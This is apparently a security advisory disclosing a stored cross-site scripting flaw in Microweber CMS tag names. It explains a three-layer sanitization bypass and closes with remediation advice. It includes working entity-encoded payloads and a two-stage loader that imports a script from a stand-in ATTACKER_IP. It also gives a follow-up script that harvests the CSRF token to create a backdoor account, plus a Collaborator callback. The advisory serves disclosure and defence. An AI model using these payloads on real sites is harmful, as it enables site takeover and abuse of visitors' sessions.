# Stored XSS via Content Tag Names - Microweber CMS 2.0.20

**Reported by:** Theodosis Paidakis  
**Date:** 2026-06-17  
**Affected versions:** v1.2.6 (April 2021) through v2.0.20 (latest)  
**CVSS 4.0 Score:** 6.3 (Medium)  
**CVSS 4.0 Vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:P/VC:L/VI:L/VA:N/SC:H/SI:H/SA:N`  

## Summary

A stored cross-site scripting vulnerability exists in Microweber's content tagging system. An attacker with admin access can inject a malicious tag name that persists in the database and executes JavaScript in two confirmed locations: the public-facing blog page and the admin post editor.

What makes this interesting is that it requires chaining three separate sanitization bypasses to get the payload through the application's defenses. The public surface fires for every visitor - authenticated or not - which turns a single injection by one compromised admin account into a site-wide, persistent attack vector.

---

## Affected Versions

The vulnerability spans the entire lifespan of the tags feature. The sanitization bypass at Layer 1 (GET method) dates back to when the XSS middleware was introduced in **v1.0.4 (August 2015)** - it has never covered GET requests. The content tagging system was present at least as far back as **v1.2.6 (April 2021)**, which is the earliest changelog reference to the tags module and therefore the earliest version where all three layers of this bypass chain are confirmed to be present together. Every release from that point through the current **v2.0.20** is affected. No patch exists at the time of this report.

---

## Root Cause - Three-Layer Bypass

The injection point is the tag save endpoint:

```
GET /api/save_content_admin?id=1&tag_names[0]=<img src=x onerror=alert(1)>
```

Three independent sanitization layers each fail to catch the payload:

**Layer 1 - XSS middleware skips GET requests**  
`src/MicroweberPackages/App/Http/Middleware/XSS.php`

```php
if (($request->isMethod('post') or $request->isMethod('patch') or $request->isMethod('put')) and !empty($input)) {
    // sanitize input
}
```

The middleware only runs for POST, PATCH, and PUT. The tag endpoint accepts GET, so the middleware never executes.

**Layer 2 - `strip_unsafe()` only strips double-quoted `onerror`**  
`src/MicroweberPackages/Helper/Format.php:722`

```php
$data = preg_replace('/onerror="(.*?)"/is', '', $data);
```

The regex requires `onerror="..."` with double quotes. An unquoted `onerror=payload` passes through untouched.

**Layer 3 - `Str::title()` displayer is bypassed with HTML entities**  
`vendor/rtconner/laravel-tagging/config/tagging.php`

```php
'displayer' => '\Illuminate\Support\Str::title',
```

The tagging package runs every tag name through `Str::title()` before storing it, which calls `mb_convert_case(MB_CASE_TITLE)` internally. This uppercases the first letter after every word boundary - and punctuation characters like `.`, `(`, `'`, and `+` count as boundaries. A naive payload like `<img src=x onerror=alert(document.domain)>` gets mangled: `document.domain` becomes `Document.Domain`, breaking the JavaScript.

The bypass is to encode the entire JS payload as HTML decimal entities. Entity references like `&#97;` contain only digits and `&`, `#`, `;` - none of which `mb_convert_case` treats as alphabetic, so they pass through unchanged. The browser then decodes them back to valid JavaScript at render time.

**Final stored payload in `mw_tagging_tags.name`:**

```
<Img Src=X Onerror=&#97;&#108;&#101;&#114;&#116;(&#39;Stored&#32;X&#83;&#83;&#32;|&#32;Microweber&#39;)>
```

---

## Surface A - Public Blog Page

**URL:** `/blog`  
**Auth required to trigger:** None  
**File:** `userfiles/modules/posts/templates/default.php:85`

```php
<span class="badge badge-primary"><?php echo $tag; ?></span>
```

The tag name is echoed directly into the HTML with no escaping. The tag badge renders as an overlay on each post's thumbnail card - every visitor to `/blog` triggers the payload on page load, with no interaction required.

### PoC Steps

1. Log in as admin
2. Send the following request (or run the included `poc.sh`):
   ```
   GET /api/save_content_admin?id=1&tag_names[0]=<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(&#39;Stored&#32;X&#83;&#83;&#32;|&#32;Microweber&#39;)>
   ```
3. Log out
4. Visit `http://<target>/blog` in any browser, without logging in

<img width="2700" height="1618" alt="image" src="https://github.com/user-attachments/assets/d94a9a8d-e00c-44f0-a673-6473fbe0b85a" />

---

## Surface B - Admin Post Editor

**URL:** `/admin/post/<id>/edit`  
**Auth required to trigger:** Admin  
**File:** `userfiles/modules/microweber/api/tags.js:253`

```javascript
tag_holder.innerHTML = '<span class="' + config.tagBtnClass + '">' + this.dataTitle(config) + '</span>';
```

The page source inlines stored tag data as a JavaScript array. The `mw.tags` widget reads this array and builds tag badges using `innerHTML`, causing the browser to parse and execute the payload on page load.

### PoC Steps

1. Inject the tag using the same GET request as above (if not already done)
2. Log in as admin
3. Navigate to `/admin/post/1/edit`

<img width="2534" height="1654" alt="image" src="https://github.com/user-attachments/assets/25d6b668-67fb-4843-97f3-2c0092edd8d8" />

---

## Real-World Attack Payload

The payloads above are for demonstration only. The tag name field is `varchar(125)`, and entity-encoding the entire payload consumes roughly 6 characters per letter, leaving very little room for meaningful inline JavaScript. The practical approach is a two-stage payload: a short loader tag stored in the database that bootstraps an external script containing the full attack logic.

**Stage 1 - stored in the tag (~74 characters with a real IP address):**

```
<img src=x onerror=&#105;&#109;&#112;&#111;&#114;&#116;('//ATTACKER_IP/p.js')>
```

`&#105;&#109;&#112;&#111;&#114;&#116;` decodes to `import` - a dynamic ES module import. An IP address is used for the server instead of a hostname because IP addresses contain no alphabetic characters and require no encoding. After `Str::title()` processes the tag, this becomes:

```
<Img Src=X Onerror=&#105;&#109;&#112;&#111;&#114;&#116;('//ATTACKER_IP/p.js')>
```

The browser decodes the entities, evaluates `import('//ATTACKER_IP/p.js')`, and the attacker's script runs with full DOM access.

**Stage 2 - external script (`p.js`) running in victim's browser:**

```javascript
// Read the CSRF token embedded in every Microweber page
const csrf = document.querySelector('meta[name="csrf-token"]').content;

// For an authenticated visitor: make requests on their behalf
// Example: register a backdoor account using their authenticated session
fetch('/api/user_register', {
    method: 'POST',
    headers: { 'X-CSRF-TOKEN': csrf, 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'name=support&email=attacker@evil.com&password=Backdoor1!'
});

// For an admin visitor: escalate to full site control
// The same CSRF token authorises any admin-level API call
fetch('/api/save_content_admin', {
    method: 'POST',
    headers: { 'X-CSRF-TOKEN': csrf, 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'id=1&title=Defaced'
});
```

Note: both session cookies (`laravel_session`, `remember_web`) are `HttpOnly`, so direct cookie theft via `document.cookie` is not possible. Session riding via same-origin `fetch()` with a harvested CSRF token is the exploitation path.

**Out-of-band confirmation:** To verify the XSS triggers real outbound network activity, the payload was modified to `fetch()` a Burp Collaborator endpoint instead of loading a full script. Visiting `/blog` while unauthenticated caused the browser to silently send a DNS lookup and HTTP request to the collaborator server with no interaction beyond the page load.

```
<img src=x onerror=&#102;&#101;&#116;&#99;&#104;('//COLLABORATOR_HOST')>
```

<img width="2480" height="1818" alt="image" src="https://github.com/user-attachments/assets/aa3cce82-793f-42be-8646-28f1baa588b7" />

<img width="2382" height="1204" alt="image" src="https://github.com/user-attachments/assets/71b100cd-117d-4507-ad5d-d14186cae1aa" />

---

## Impact

The injection requires admin credentials, so this is not a zero-auth issue. The realistic attack scenario is:

- Attacker compromises an admin account (phishing, credential stuffing, password reuse)
- Injects the tag with a single GET request and logs out
- The payload now fires for **every visitor to `/blog`**, including future admins
- The XSS lives in the database, not in a session
- For authenticated visitors, the payload can make authenticated API calls on their behalf (session riding via `fetch()`, reading the CSRF token from `<meta name="csrf-token">`)
- If an admin visits the blog or opens the post editor, the attacker can silently create a backdoor account or make any admin-level API call

---

## Remediation

Two independent fixes, either of which would prevent this at the source:

1. **Extend the XSS middleware to cover GET requests**, or validate/sanitize the `tag_names` parameter at the controller level regardless of HTTP method
2. **Fix `strip_unsafe()`** to cover unquoted event handler attributes: change the regex from `onerror="(.*?)"` to handle both quoted and unquoted forms, or replace regex-based sanitization with an HTML parser

Additionally, escaping at each render site would prevent execution even if the payload reaches the database:
- `default.php:85`: use `htmlspecialchars($tag, ENT_QUOTES, 'UTF-8')`
- `tags.js:253`: use `textContent` instead of `innerHTML`

The root fix should be at the storage layer - sanitize on input, not just on output. A proper allowlist for tag name characters (alphanumeric, spaces, hyphens) at save time would prevent the payload from ever entering the database.
